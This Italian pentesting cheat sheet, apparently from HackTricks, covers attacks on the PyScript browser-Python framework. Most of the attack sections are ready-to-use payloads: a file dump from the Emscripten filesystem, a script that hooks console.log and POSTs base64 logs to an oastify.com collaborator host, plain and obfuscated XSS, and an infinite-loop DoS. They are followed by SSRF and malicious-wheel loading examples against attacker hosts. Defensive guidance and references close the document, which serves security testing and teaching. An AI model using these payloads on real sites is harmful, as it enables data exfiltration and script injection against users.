# Pyscript

## Guida al pentesting di PyScript

PyScript è un nuovo framework sviluppato per integrare Python nell'HTML, in modo da poterlo utilizzare insieme all'HTML. In questo cheat sheet troverai come utilizzare PyScript per le tue attività di pentesting.

### Dumping / Recupero di file dal filesystem di memoria virtuale di Emscripten:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Risultato:

![Guida al pentesting di PyScript - Dumping / Recupero di file dal filesystem di memoria virtuale di Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration del filesystem di memoria virtuale di Emscripten (monitoraggio della console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Codice:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Risultato:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinario)

Codice:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Risultato:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Codice:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Risultato:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Codice:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Risultato:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (loop infinito)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (loop infinito)

Codice:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Risultato:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nuove vulnerabilità e tecniche (2023-2025)

### Server-Side Request Forgery tramite redirect non controllati (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignora i parametri di richiesta `redirect` e `retries` quando vengono utilizzati con il browser transport di Pyodide. Se un attacker può influenzare gli URL di destinazione, il codice potrebbe seguire redirect tra domini anche quando chiede a urllib3 di disabilitarli, indebolendo le difese contro SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Esegui l'upgrade a `urllib3 >= 2.5.0` per Node.js, ma non fare affidamento su urllib3 per disabilitare i redirect nei browser; valida le destinazioni o usa una allow-list prima di effettuare le richieste.<sup>[[4]](#references)</sup>

### Caricamento arbitrario di pacchetti e attacchi alla supply chain

La configurazione di Pyodide di PyScript accetta URL arbitrari di wheel in `packages`; se un attaccante può modificare o iniettare tale configurazione, un import successivo può eseguire codice Python controllato dall'attaccante nel browser della vittima.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide può installare wheel pure-Python da URL arbitrari senza una build WebAssembly del package.<sup>[[6]](#references)</sup> Mantieni questa configurazione sotto il controllo dello sviluppatore, consenti tramite allow-list solo nomi esatti dei package o URL e verifica i digest delle wheel remote durante la build o il deployment.

### Modifiche alla sanitizzazione dell'output (2023+)

* Nell'implementazione 2022.05.1 utilizzata dagli esempi legacy, `print()` scrive l'output `text/plain` senza effettuare l'escaping HTML ed è quindi vulnerabile a XSS.<sup>[[8]](#references)</sup>
* L'helper `display()` attuale **effettua l'escaping dell'HTML per impostazione predefinita** per le stringhe semplici; il markup raw deve essere racchiuso in `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Usa `display()` per gli input non attendibili e non passare stringhe non attendibili a `HTML()`.<sup>[[2]](#references)</sup>

---

## Best practice difensive

* **Mantieni aggiornati i package** – usa `urllib3 >= 2.5.0` in Node.js e verifica separatamente le ipotesi sui redirect del browser.<sup>[[4]](#references)</sup>
* **Limita le origini dei package** – consenti tramite allow-list i nomi PyPI o URL attendibili esatti e verifica i digest dei wheel remoti durante la build o il deployment.<sup>[[5]](#references)[[6]](#references)</sup>
* **Rafforza la Content Security Policy** – disabilita JavaScript inline (`script-src 'self' 'sha256-…'`) in modo che i blocchi `<script>` iniettati non possano essere eseguiti.
* **Impedisci i tag `<py-script>` / `<script type="py">` forniti dall'utente** – esegui il sanitising dell'HTML sul server prima di rimandarlo ad altri utenti.
* **Isola i worker** – se non ti serve l'accesso sincrono al DOM dai worker, abilita il flag `sync_main_only` per evitare `SharedArrayBuffer` e i requisiti associati relativi agli header CORS.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Documentazione dei built-in di PyScript – `display` e `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - L'arte del vulnerability chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Avviso di sicurezza di urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Documentazione sulla configurazione di PyScript – packages e `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Caricamento dei package](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Implementazione di `pyscript.py` di PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
